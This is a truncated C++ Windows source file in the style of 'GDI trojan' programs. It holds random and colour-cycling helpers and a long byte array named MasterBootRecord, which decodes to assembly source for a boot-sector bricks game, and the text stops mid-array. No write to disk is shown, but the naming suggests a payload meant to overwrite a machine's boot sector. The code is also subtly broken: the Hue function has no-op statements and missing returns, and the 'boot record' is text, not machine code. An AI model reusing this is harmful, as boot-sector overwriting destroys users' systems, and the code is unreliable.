#include <windows.h>
#include <wingdi.h>
#include <mmsystem.h>
#include <ctime>
#include <cmath> 
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#define M_PI   3.14159265358979323846264338327950288
DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}
DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}
static ULONGLONG n, r;
int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
	unsigned int RGB;
}_RGBQUAD, * PRGBQUAD;

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
const unsigned char MasterBootRecord[] = {
  0x09, 0x3b, 0x0a, 0x09, 0x3b, 0x20, 0x42, 0x72, 0x69, 0x63, 0x6b, 0x73,
  0x20, 0x67, 0x61, 0x6d, 0x65, 0x20, 0x69, 0x6e, 0x20, 0x6f, 0x6e, 0x65,
  0x20, 0x62, 0x6f, 0x6f, 0x74, 0x20, 0x73, 0x65, 0x63, 0x74, 0x6f, 0x72,
  0x0a, 0x09, 0x3b, 0x0a, 0x09, 0x3b, 0x20, 0x62, 0x79, 0x20, 0x4f, 0x73,
  0x63, 0x61, 0x72, 0x20, 0x54, 0x6f, 0x6c, 0x65, 0x64, 0x6f, 0x20, 0x47,
  0x2e, 0x0a, 0x09, 0x3b, 0x0a, 0x09, 0x3b, 0x20, 0x43, 0x72, 0x65, 0x61,
  0x74, 0x69, 0x6f, 0x6e, 0x20, 0x64, 0x61, 0x74, 0x65, 0x3a, 0x20, 0x4e,
  0x6f, 0x76, 0x2f, 0x30, 0x32, 0x2f, 0x32, 0x30, 0x31, 0x39, 0x2e, 0x0a,
  0x09, 0x3b, 0x0a, 0x0a, 0x09, 0x63, 0x70, 0x75, 0x20, 0x38, 0x30, 0x38,
  0x36, 0x0a, 0x0a, 0x09, 0x3b, 0x0a, 0x09, 0x3b, 0x20, 0x50, 0x72, 0x65,
  0x73, 0x73, 0x20, 0x4c, 0x65, 0x66, 0x74, 0x20, 0x53, 0x68, 0x69, 0x66,
  0x74, 0x20, 0x74, 0x6f, 0x20, 0x73, 0x74, 0x61, 0x72, 0x74, 0x20, 0x74,
  0x68, 0x65, 0x20, 0x67, 0x61, 0x6d, 0x65, 0x0a, 0x09, 0x3b, 0x20, 0x50,
  0x72, 0x65, 0x73, 0x73, 0x20, 0x4c, 0x65, 0x66, 0x74, 0x20, 0x43, 0x74,
  0x72, 0x6c, 0x20, 0x74, 0x6f, 0x20, 0x6d, 0x6f, 0x76, 0x65, 0x20, 0x74,
  0x68, 0x65, 0x20, 0x70, 0x61, 0x64, 0x64, 0x6c, 0x65, 0x20, 0x74, 0x6f,
  0x20, 0x74, 0x68, 0x65, 0x20, 0x6c, 0x65, 0x66, 0x74, 0x0a, 0x09, 0x3b,
  0x20, 0x50, 0x72, 0x65, 0x73, 0x73, 0x20, 0x4c, 0x65, 0x66, 0x74, 0x20,
  0x41, 0x6c, 0x74, 0x20, 0x74, 0x6f, 0x20, 0x6d, 0x6f, 0x76, 0x65, 0x20,
  0x74, 0x68, 0x65, 0x20, 0x70, 0x61, 0x64, 0x64, 0x6c, 0x65, 0x20, 0x74,
  0x6f, 0x20, 0x74, 0x68, 0x65, 0x20, 0x72, 0x69, 0x67, 0x68, 0x74, 0x0a,
  0x09, 0x3b, 0x0a, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x25, 0x69, 0x66, 0x64,
  0x65, 0x66, 0x20, 0x63, 0x6f, 0x6d, 0x5f, 0x66, 0x69, 0x6c, 0x65, 0x0a,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x6f, 0x72, 0x67, 0x20,
  0x30, 0x78, 0x30, 0x31, 0x30, 0x30, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x25,
  0x65, 0x6c, 0x73, 0x65, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x6f, 0x72, 0x67, 0x20, 0x30, 0x78, 0x37, 0x63, 0x30, 0x30, 0x0a,
  0x20, 0x20, 0x20, 0x20, 0x25, 0x65, 0x6e, 0x64, 0x69, 0x66, 0x0a, 0x0a,
  0x6f, 0x6c, 0x64, 0x5f, 0x74, 0x69, 0x6d, 0x65, 0x3a, 0x09, 0x65, 0x71,
  0x75, 0x20, 0x31, 0x36, 0x09, 0x3b, 0x20, 0x4f, 0x6c, 0x64, 0x20, 0x74,
  0x69, 0x6d, 0x65, 0x20, 0x0a, 0x62, 0x61, 0x6c, 0x6c, 0x5f, 0x78, 0x3a,
  0x09, 0x09, 0x65, 0x71, 0x75, 0x20, 0x31, 0x34, 0x09, 0x3b, 0x20, 0x58,
  0x2d, 0x63, 0x6f, 0x6f, 0x72, 0x64, 0x69, 0x6e, 0x61, 0x74, 0x65, 0x20,
  0x6f, 0x66, 0x20, 0x62, 0x61, 0x6c, 0x6c, 0x20, 0x28, 0x38, 0x2e, 0x38,
  0x20, 0x66, 0x72, 0x61, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x29, 0x0a, 0x62,
  0x61, 0x6c, 0x6c, 0x5f, 0x79, 0x3a, 0x09, 0x09, 0x65, 0x71, 0x75, 0x20,
  0x31, 0x32, 0x09, 0x3b, 0x20, 0x59, 0x2d, 0x63, 0x6f, 0x6f, 0x72, 0x64,
  0x69, 0x6e, 0x61, 0x74, 0x65, 0x20, 0x6f, 0x66, 0x20, 0x62, 0x61, 0x6c,
  0x6c, 0x20, 0x28, 0x38, 0x2e, 0x38, 0x20, 0x66, 0x72, 0x61, 0x63, 0x74,
  0x69, 0x6f, 0x6e, 0x29, 0x0a, 0x62, 0x61, 0x6c, 0x6c, 0x5f, 0x78, 0x73,
  0x3a, 0x09, 0x65, 0x71, 0x75, 0x20, 0x31, 0x30, 0x09, 0x3b, 0x20, 0x58,
  0x2d, 0x73, 0x70, 0x65, 0x65, 0x64, 0x20, 0x6f, 0x66, 0x20, 0x62, 0x61,
  0x6c, 0x6c, 0x20, 0x28, 0x38, 0x2e, 0x38, 0x20, 0x66, 0x72, 0x61, 0x63,
  0x74, 0x69, 0x6f, 0x6e, 0x29, 0x0a, 0x62, 0x61, 0x6c, 0x6c, 0x5f, 0x79,
  0x73, 0x3a, 0x09, 0x65, 0x71, 0x75, 0x20, 0x38, 0x09, 0x3b, 0x20, 0x59,
  0x2d, 0x73, 0x70, 0x65, 0x65, 0x64, 0x20, 0x6f, 0x66, 0x20, 0x62, 0x61,
  0x6c, 0x6c, 0x20, 0x28, 0x38, 0x2e, 0x38, 0x20, 0x66, 0x72, 0x61, 0x63,
  0x74, 0x69, 0x6f, 0x6e, 0x29, 0x0a, 0x62, 0x65, 0x65, 0x70, 0x3a, 0x09,
  0x09, 0x65, 0x71, 0x75, 0x20, 0x36, 0x09, 0x3b, 0x20, 0x46, 0x72, 0x61,
  0x6d, 0x65, 0x20, 0x63, 0x6f, 0x75, 0x6e, 0x74, 0x20, 0x74, 0x6f, 0x20,
  0x74, 0x75, 0x72, 0x6e, 0x20, 0x6f, 0x66, 0x66, 0x20, 0x73, 0x6f, 0x75,
  0x6e, 0x64, 0x0a, 0x62, 0x72, 0x69, 0x63, 0x6b, 0x73, 0x3a, 0x09, 0x09,
  0x65, 0x71, 0x75, 0x20, 0x34, 0x09, 0x3b, 0x20, 0x52, 0x65, 0x6d, 0x61,
  0x69, 0x6e, 0x69, 0x6e, 0x67, 0x20, 0x62, 0x72, 0x69, 0x63, 0x6b, 0x73,
  0x0a, 0x62, 0x61, 0x6c, 0x6c, 0x73, 0x3a, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x65, 0x71, 0x75, 0x20, 0x32, 0x09, 0x3b, 0x20,
  0x52, 0x65, 0x6d, 0x61, 0x69, 0x6e, 0x69, 0x6e, 0x67, 0x20, 0x62, 0x61,
  0x6c, 0x6c, 0x73, 0x0a, 0x73, 0x63, 0x6f, 0x72, 0x65, 0x3a, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x65, 0x71, 0x75, 0x20, 0x30,
  0x09, 0x3b, 0x20, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x20, 0x73,
  0x63, 0x6f, 0x72, 0x65, 0x0a, 0x0a, 0x09, 0x3b, 0x0a, 0x09, 0x3b, 0x20,
  0x53, 0x74, 0x61, 0x72, 0x74, 0x20, 0x6f, 0x66, 0x20, 0x74, 0x68, 0x65,
  0x20, 0x67, 0x61, 0x6d, 0x65, 0x0a, 0x09, 0x3b, 0x0a, 0x73, 0x74, 0x61,
  0x72, 0x74, 0x3a, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x61, 0x78, 0x2c,
  0x30, 0x78, 0x30, 0x30, 0x30, 0x32, 0x09, 0x09, 0x3b, 0x20, 0x54, 0x65,
  0x78, 0x74, 0x20, 0x6d, 0x6f, 0x64, 0x65, 0x20, 0x38, 0x30, 0x78, 0x32,
  0x35, 0x78, 0x31, 0x36, 0x20, 0x63, 0x6f, 0x6c, 0x6f, 0x72, 0x73, 0x0a,
  0x09, 0x69, 0x6e, 0x74, 0x20, 0x30, 0x78, 0x31, 0x30, 0x09, 0x09, 0x3b,
  0x20, 0x53, 0x65, 0x74, 0x75, 0x70, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20,
  0x61, 0x78, 0x2c, 0x30, 0x78, 0x62, 0x38, 0x30, 0x30, 0x09, 0x09, 0x3b,
  0x20, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20, 0x6f, 0x66, 0x20,
  0x76, 0x69, 0x64, 0x65, 0x6f, 0x20, 0x73, 0x63, 0x72, 0x65, 0x65, 0x6e,
  0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x64, 0x73, 0x2c, 0x61, 0x78, 0x09,
  0x09, 0x3b, 0x20, 0x53, 0x65, 0x74, 0x75, 0x70, 0x20, 0x44, 0x53, 0x0a,
  0x09, 0x6d, 0x6f, 0x76, 0x20, 0x65, 0x73, 0x2c, 0x61, 0x78, 0x09, 0x09,
  0x3b, 0x20, 0x53, 0x65, 0x74, 0x75, 0x70, 0x20, 0x45, 0x53, 0x0a, 0x09,
  0x73, 0x75, 0x62, 0x20, 0x73, 0x70, 0x2c, 0x33, 0x32, 0x0a, 0x09, 0x78,
  0x6f, 0x72, 0x20, 0x61, 0x78, 0x2c, 0x61, 0x78, 0x0a, 0x09, 0x70, 0x75,
  0x73, 0x68, 0x20, 0x61, 0x78, 0x09, 0x09, 0x09, 0x3b, 0x20, 0x52, 0x65,
  0x73, 0x65, 0x74, 0x20, 0x73, 0x63, 0x6f, 0x72, 0x65, 0x0a, 0x09, 0x6d,
  0x6f, 0x76, 0x20, 0x61, 0x6c, 0x2c, 0x34, 0x09, 0x09, 0x0a, 0x09, 0x70,
  0x75, 0x73, 0x68, 0x20, 0x61, 0x78, 0x09, 0x09, 0x09, 0x3b, 0x20, 0x42,
  0x61, 0x6c, 0x6c, 0x73, 0x20, 0x72, 0x65, 0x6d, 0x61, 0x69, 0x6e, 0x69,
  0x6e, 0x67, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x62, 0x70, 0x2c, 0x73,
  0x70, 0x09, 0x09, 0x3b, 0x20, 0x53, 0x65, 0x74, 0x75, 0x70, 0x20, 0x73,
  0x74, 0x61, 0x63, 0x6b, 0x20, 0x66, 0x72, 0x61, 0x6d, 0x65, 0x20, 0x66,
  0x6f, 0x72, 0x20, 0x67, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x73, 0x0a, 0x09,
  0x3b, 0x0a, 0x09, 0x3b, 0x20, 0x53, 0x74, 0x61, 0x72, 0x74, 0x20, 0x61,
  0x6e, 0x6f, 0x74, 0x68, 0x65, 0x72, 0x20, 0x6c, 0x65, 0x76, 0x65, 0x6c,
  0x20, 0x0a, 0x09, 0x3b, 0x0a, 0x61, 0x6e, 0x6f, 0x74, 0x68, 0x65, 0x72,
  0x5f, 0x6c, 0x65, 0x76, 0x65, 0x6c, 0x3a, 0x0a, 0x09, 0x6d, 0x6f, 0x76,
  0x20, 0x77, 0x6f, 0x72, 0x64, 0x20, 0x5b, 0x62, 0x70, 0x2b, 0x62, 0x72,
  0x69, 0x63, 0x6b, 0x73, 0x5d, 0x2c, 0x32, 0x37, 0x33, 0x09, 0x3b, 0x20,
  0x32, 0x37, 0x33, 0x20, 0x62, 0x72, 0x69, 0x63, 0x6b, 0x73, 0x20, 0x6f,
  0x6e, 0x20, 0x73, 0x63, 0x72, 0x65, 0x65, 0x6e, 0x0a, 0x09, 0x78, 0x6f,
  0x72, 0x20, 0x64, 0x69, 0x2c, 0x64, 0x69, 0x0a, 0x09, 0x6d, 0x6f, 0x76,
  0x20, 0x61, 0x78, 0x2c, 0x30, 0x78, 0x30, 0x31, 0x62, 0x31, 0x09, 0x09,
  0x3b, 0x20, 0x44, 0x72, 0x61, 0x77, 0x20, 0x74, 0x6f, 0x70, 0x20, 0x62,
  0x6f, 0x72, 0x64, 0x65, 0x72, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x63,
  0x78, 0x2c, 0x38, 0x30, 0x0a, 0x09, 0x63, 0x6c, 0x64, 0x0a, 0x09, 0x72,
  0x65, 0x70, 0x20, 0x73, 0x74, 0x6f, 0x73, 0x77, 0x0a, 0x09, 0x6d, 0x6f,
  0x76, 0x20, 0x63, 0x6c, 0x2c, 0x32, 0x34, 0x09, 0x09, 0x3b, 0x20, 0x32,
  0x34, 0x20, 0x72, 0x6f, 0x77, 0x73, 0x0a, 0x2e, 0x31, 0x3a, 0x0a, 0x09,
  0x73, 0x74, 0x6f, 0x73, 0x77, 0x09, 0x09, 0x09, 0x3b, 0x20, 0x44, 0x72,
  0x61, 0x77, 0x20, 0x6c, 0x65, 0x66, 0x74, 0x20, 0x62, 0x6f, 0x72, 0x64,
  0x65, 0x72, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x61, 0x78, 0x2c, 0x30,
  0x78, 0x32, 0x30, 0x09, 0x09, 0x3b, 0x20, 0x4e, 0x6f, 0x20, 0x62, 0x72,
  0x69, 0x63, 0x6b, 0x73, 0x20, 0x6f, 0x6e, 0x20, 0x74, 0x68, 0x69, 0x73,
  0x20, 0x72, 0x6f, 0x77, 0x0a, 0x09, 0x70, 0x75, 0x73, 0x68, 0x20, 0x63,
  0x78, 0x0a, 0x09, 0x63, 0x6d, 0x70, 0x20, 0x63, 0x6c, 0x2c, 0x32, 0x33,
  0x0a, 0x09, 0x6a, 0x6e, 0x62, 0x20, 0x2e, 0x32, 0x0a, 0x09, 0x73, 0x75,
  0x62, 0x20, 0x63, 0x6c, 0x2c, 0x31, 0x35, 0x0a, 0x09, 0x6a, 0x62, 0x65,
  0x20, 0x2e, 0x32, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x61, 0x6c, 0x2c,
  0x30, 0x78, 0x64, 0x62, 0x09, 0x09, 0x3b, 0x20, 0x42, 0x72, 0x69, 0x63,
  0x6b, 0x73, 0x20, 0x6f, 0x6e, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x72,
  0x6f, 0x77, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x61, 0x68, 0x2c, 0x63,
  0x6c, 0x0a, 0x2e, 0x32, 0x3a, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x63,
  0x6c, 0x2c, 0x33, 0x39, 0x09, 0x09, 0x3b, 0x20, 0x33, 0x39, 0x20, 0x62,
  0x72, 0x69, 0x63, 0x6b, 0x73, 0x20, 0x70, 0x65, 0x72, 0x20, 0x72, 0x6f,
  0x77, 0x0a, 0x2e, 0x33, 0x3a, 0x0a, 0x09, 0x73, 0x74, 0x6f, 0x73, 0x77,
  0x0a, 0x09, 0x73, 0x74, 0x6f, 0x73, 0x77, 0x0a, 0x09, 0x69, 0x6e, 0x63,
  0x20, 0x61, 0x68, 0x09, 0x09, 0x09, 0x3b, 0x20, 0x49, 0x6e, 0x63, 0x72,
  0x65, 0x61, 0x73, 0x65, 0x20, 0x61, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75,
  0x74, 0x65, 0x20, 0x63, 0x6f, 0x6c, 0x6f, 0x72, 0x0a, 0x09, 0x63, 0x6d,
  0x70, 0x20, 0x61, 0x68, 0x2c, 0x30, 0x78, 0x30, 0x38, 0x0a, 0x09, 0x6a,
  0x6e, 0x65, 0x20, 0x2e, 0x34, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x61,
  0x68, 0x2c, 0x30, 0x78, 0x30, 0x31, 0x0a, 0x2e, 0x34, 0x3a, 0x0a, 0x09,
  0x6c, 0x6f, 0x6f, 0x70, 0x20, 0x2e, 0x33, 0x0a, 0x09, 0x70, 0x6f, 0x70,
  0x20, 0x63, 0x78, 0x0a, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x61, 0x78,
  0x2c, 0x30, 0x78, 0x30, 0x31, 0x62, 0x31, 0x09, 0x09, 0x3b, 0x20, 0x44,
  0x72, 0x61, 0x77, 0x20, 0x72, 0x69, 0x67, 0x68, 0x74, 0x20, 0x62, 0x6f,
  0x72, 0x64, 0x65, 0x72, 0x0a, 0x09, 0x73, 0x74, 0x6f, 0x73, 0x77, 0x0a,
  0x09, 0x6c, 0x6f, 0x6f, 0x70, 0x20, 0x2e, 0x31, 0x0a, 0x0a, 0x09, 0x3b,
  0x0a, 0x09, 0x3b, 0x20, 0x53, 0x74, 0x61, 0x72, 0x74, 0x20, 0x61, 0x6e,
  0x6f, 0x74, 0x68, 0x65, 0x72, 0x20, 0x62, 0x61, 0x6c, 0x6c, 0x0a, 0x09,
  0x3b, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x64, 0x69, 0x2c, 0x30, 0x78,
  0x30, 0x66, 0x34, 0x61, 0x09, 0x09, 0x3b, 0x20, 0x50, 0x6f, 0x73, 0x69,
  0x74, 0x69, 0x6f, 0x6e, 0x20, 0x6f, 0x66, 0x20, 0x70, 0x61, 0x64, 0x64,
  0x6c, 0x65, 0x0a, 0x61, 0x6e, 0x6f, 0x74, 0x68, 0x65, 0x72, 0x5f, 0x62,
  0x61, 0x6c, 0x6c, 0x3a, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x62, 0x79,
  0x74, 0x65, 0x20, 0x5b, 0x62, 0x70, 0x2b, 0x62, 0x61, 0x6c, 0x6c, 0x5f,
  0x78, 0x2b, 0x31, 0x5d, 0x2c, 0x30, 0x78, 0x32, 0x38, 0x09, 0x3b, 0x20,
  0x43, 0x65, 0x6e, 0x74, 0x65, 0x72, 0x20, 0x58, 0x0a, 0x09, 0x6d, 0x6f,
  0x76, 0x20, 0x62, 0x79, 0x74, 0x65, 0x20, 0x5b, 0x62, 0x70, 0x2b, 0x62,
  0x61, 0x6c, 0x6c, 0x5f, 0x79, 0x2b, 0x31, 0x5d, 0x2c, 0x30, 0x78, 0x31,
  0x34, 0x09, 0x3b, 0x20, 0x43, 0x65, 0x6e, 0x74, 0x65, 0x72, 0x20, 0x59,
  0x0a, 0x09, 0x78, 0x6f, 0x72, 0x20, 0x61, 0x78, 0x2c, 0x61, 0x78, 0x0a,
  0x09, 0x6d, 0x6f, 0x76, 0x20, 0x5b, 0x62, 0x70, 0x2b, 0x62, 0x61, 0x6c,
  0x6c, 0x5f, 0x78, 0x73, 0x5d, 0x2c, 0x61, 0x78, 0x09, 0x3b, 0x20, 0x53,
  0x74, 0x61, 0x74, 0x69, 0x63, 0x20, 0x6f, 0x6e, 0x20, 0x73, 0x63, 0x72,
  0x65, 0x65, 0x6e, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x5b, 0x62, 0x70,
  0x2b, 0x62, 0x61, 0x6c, 0x6c, 0x5f, 0x79, 0x73, 0x5d, 0x2c, 0x61, 0x78,
  0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x62, 0x79, 0x74, 0x65, 0x20, 0x5b,
  0x62, 0x70, 0x2b, 0x62, 0x65, 0x65, 0x70, 0x5d, 0x2c, 0x30, 0x78, 0x30,
  0x31, 0x0a, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x73, 0x69, 0x2c, 0x30,
  0x78, 0x30, 0x66, 0x66, 0x65, 0x09, 0x09, 0x3b, 0x20, 0x44, 0x6f, 0x6e,
  0x27, 0x74, 0x20, 0x65, 0x72, 0x61, 0x73, 0x65, 0x20, 0x62, 0x61, 0x6c,
  0x6c, 0x20, 0x79, 0x65, 0x74, 0x0a, 0x67, 0x61, 0x6d, 0x65, 0x5f, 0x6c,
  0x6f, 0x6f, 0x70, 0x3a, 0x0a, 0x09, 0x63, 0x61, 0x6c, 0x6c, 0x20, 0x77,
  0x61, 0x69, 0x74, 0x5f, 0x66, 0x72, 0x61, 0x6d, 0x65, 0x09, 0x09, 0x3b,
  0x20, 0x57, 0x61, 0x69, 0x74, 0x20, 0x31, 0x2f, 0x31, 0x38, 0x2e, 0x32,
  0x20, 0x73, 0x65, 0x63, 0x73, 0x2e, 0x0a, 0x0a, 0x09, 0x6d, 0x6f, 0x76,
  0x20, 0x77, 0x6f, 0x72, 0x64, 0x20, 0x5b, 0x73, 0x69, 0x5d, 0x2c, 0x30,
  0x78, 0x30, 0x30, 0x30, 0x30, 0x09, 0x3b, 0x20, 0x45, 0x72, 0x61, 0x73,
  0x65, 0x20, 0x62, 0x61, 0x6c, 0x6c, 0x0a, 0x09, 0x0a, 0x09, 0x63, 0x61,
  0x6c, 0x6c, 0x20, 0x75, 0x70, 0x64, 0x61, 0x74, 0x65, 0x5f, 0x73, 0x63,
  0x6f, 0x72, 0x65, 0x09, 0x3b, 0x20, 0x55, 0x70, 0x64, 0x61, 0x74, 0x65,
  0x20, 0x73, 0x63, 0x6f, 0x72, 0x65, 0x0a, 0x09, 0x0a, 0x09, 0x6d, 0x6f,
  0x76, 0x20, 0x61, 0x68, 0x2c, 0x30, 0x78, 0x30, 0x32, 0x09, 0x09, 0x3b,
  0x20, 0x52, 0x65, 0x61, 0x64, 0x20, 0x6d, 0x6f, 0x64, 0x69, 0x66, 0x69,
  0x65, 0x72, 0x20, 0x6b, 0x65, 0x79, 0x73, 0x0a, 0x09, 0x69, 0x6e, 0x74,
  0x20, 0x30, 0x78, 0x31, 0x36, 0x0a, 0x09, 0x74, 0x65, 0x73, 0x74, 0x20,
  0x61, 0x6c, 0x2c, 0x30, 0x78, 0x30, 0x34, 0x09, 0x09, 0x3b, 0x20, 0x4c,
  0x65, 0x66, 0x74, 0x20, 0x63, 0x74, 0x72, 0x6c, 0x0a, 0x09, 0x6a, 0x65,
  0x20, 0x2e, 0x31, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x62, 0x79, 0x74,
  0x65, 0x20, 0x5b, 0x64, 0x69, 0x2b, 0x36, 0x5d, 0x2c, 0x30, 0x09, 0x3b,
  0x20, 0x45, 0x72, 0x61, 0x73, 0x65, 0x20, 0x72, 0x69, 0x67, 0x68, 0x74,
  0x20, 0x73, 0x69, 0x64, 0x65, 0x20, 0x6f, 0x66, 0x20, 0x70, 0x61, 0x64,
  0x64, 0x6c, 0x65, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x62, 0x79, 0x74,
  0x65, 0x20, 0x5b, 0x64, 0x69, 0x2b, 0x38, 0x5d, 0x2c, 0x30, 0x0a, 0x09,
  0x73, 0x75, 0x62, 0x20, 0x64, 0x69, 0x2c, 0x62, 0x79, 0x74, 0x65, 0x20,
  0x34, 0x09, 0x09, 0x3b, 0x20, 0x4d, 0x6f, 0x76, 0x65, 0x20, 0x70, 0x61,
  0x64, 0x64, 0x6c, 0x65, 0x20, 0x74, 0x6f, 0x20, 0x6c, 0x65, 0x66, 0x74,
  0x0a, 0x09, 0x63, 0x6d, 0x70, 0x20, 0x64, 0x69, 0x2c, 0x30, 0x78, 0x30,
  0x66, 0x30, 0x32, 0x09, 0x09, 0x3b, 0x20, 0x4c, 0x69, 0x6d, 0x69, 0x74,
  0x0a, 0x09, 0x6a, 0x61, 0x20, 0x2e, 0x31, 0x0a, 0x09, 0x6d, 0x6f, 0x76,
  0x20, 0x64, 0x69, 0x2c, 0x30, 0x78, 0x30, 0x66, 0x30, 0x32, 0x0a, 0x2e,
  0x31, 0x3a, 0x0a, 0x09, 0x74, 0x65, 0x73, 0x74, 0x20, 0x61, 0x6c, 0x2c,
  0x30, 0x78, 0x30, 0x38, 0x09, 0x09, 0x3b, 0x20, 0x4c, 0x65, 0x66, 0x74,
  0x20, 0x61, 0x6c, 0x74, 0x0a, 0x09, 0x6a, 0x65, 0x20, 0x2e, 0x32, 0x0a,
  0x09, 0x78, 0x6f, 0x72, 0x20, 0x61, 0x78, 0x2c, 0x61, 0x78, 0x09, 0x09,
  0x3b, 0x20, 0x45, 0x72, 0x61, 0x73, 0x65, 0x20, 0x6c, 0x65, 0x66, 0x74,
  0x20, 0x73, 0x69, 0x64, 0x65, 0x20, 0x6f, 0x66, 0x20, 0x70, 0x61, 0x64,
  0x64, 0x6c, 0x65, 0x0a, 0x09, 0x73, 0x74, 0x6f, 0x73, 0x77, 0x0a, 0x09,
  0x73, 0x74, 0x6f, 0x73, 0x77, 0x09, 0x09, 0x09, 0x3b, 0x20, 0x44, 0x49,
  0x20, 0x69, 0x6e, 0x63, 0x72, 0x65, 0x61, 0x73, 0x65, 0x64, 0x20, 0x61,
  0x75, 0x74, 0x6f, 0x6d, 0x61, 0x74, 0x69, 0x63, 0x61, 0x6c, 0x6c, 0x79,
  0x0a, 0x09, 0x63, 0x6d, 0x70, 0x20, 0x64, 0x69, 0x2c, 0x30, 0x78, 0x30,
  0x66, 0x39, 0x34, 0x09, 0x09, 0x3b, 0x20, 0x4c, 0x69, 0x6d, 0x69, 0x74,
  0x0a, 0x09, 0x6a, 0x62, 0x20, 0x2e, 0x32, 0x0a, 0x09, 0x6d, 0x6f, 0x76,
  0x20, 0x64, 0x69, 0x2c, 0x30, 0x78, 0x30, 0x66, 0x39, 0x34, 0x09, 0x0a,
  0x2e, 0x32, 0x3a, 0x0a, 0x09, 0x74, 0x65, 0x73, 0x74, 0x20, 0x61, 0x6c,
  0x2c, 0x30, 0x78, 0x30, 0x32, 0x09, 0x09, 0x3b, 0x20, 0x4c, 0x65, 0x66,
  0x74, 0x20, 0x73, 0x68, 0x69, 0x66, 0x74, 0x0a, 0x09, 0x6a, 0x65, 0x20,
  0x2e, 0x31, 0x35, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x61, 0x78, 0x2c,
  0x5b, 0x62, 0x70, 0x2b, 0x62, 0x61, 0x6c, 0x6c, 0x5f, 0x78, 0x73, 0x5d,
  0x09, 0x3b, 0x20, 0x42, 0x61, 0x6c, 0x6c, 0x20, 0x6d, 0x6f, 0x76, 0x69,
  0x6e, 0x67, 0x3f, 0x0a, 0x09, 0x61, 0x64, 0x64, 0x20, 0x61, 0x78, 0x2c,
  0x5b, 0x62, 0x70, 0x2b, 0x62, 0x61, 0x6c, 0x6c, 0x5f, 0x79, 0x73, 0x5d,
  0x0a, 0x09, 0x6a, 0x6e, 0x65, 0x20, 0x2e, 0x31, 0x35, 0x09, 0x09, 0x09,
  0x3b, 0x20, 0x59, 0x65, 0x73, 0x2c, 0x20, 0x6a, 0x75, 0x6d, 0x70, 0x0a,
  0x09, 0x09, 0x09, 0x09, 0x3b, 0x20, 0x53, 0x65, 0x74, 0x75, 0x70, 0x20,
  0x6d, 0x6f, 0x76, 0x65, 0x6d, 0x65, 0x6e, 0x74, 0x20, 0x6f, 0x66, 0x20,
  0x62, 0x61, 0x6c, 0x6c, 0x0a, 0x09, 0x6d, 0x6f, 0x76, 0x20, 0x77, 0x6f,
  0x72, 0x64, 0x20, 0x5b, 0x62, 0x70, 0x2b, 0x62, 0x61, 0x6c, 0x6c, 0x5f,
  0x78, 0x73, 0x5d, 0x2c, 0x30, 0x78, 0x66, 0x66, 0x34, 0x30, 0x0a, 0x09,
  0x6d, 0x6f, 0x76, 0x20, 0x77, 0x6f, 0x72, 0x64, 0x20, 0x5b, 0x62, 0x70,
  0x2b, 0x62, 0x61, 0x6c, 0x6c, 0x5f, 0x79, 0x73, 0x5d, 0x2c, 0x30, 0x78,
  0x66, 0x66, 0x38, 0x30, 0x0a, 0x2e, 0x31, 0x35, 0x3a, 0x0a, 0x09, 0x6d,
  0x6f, 0x76, 0x20, 0x61, 0x78, 0x2c, 0x30, 0x78, 0x30, 0x61, 0x64, 0x66,
  0x09, 0x09, 0x3b, 0x20, 0x50, 0x61, 0x64, 0x64, 0x6c, 0x65, 0x20, 0x67,
  0x72, 0x61, 0x70, 0x68, 0x69, 0x63, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x63,
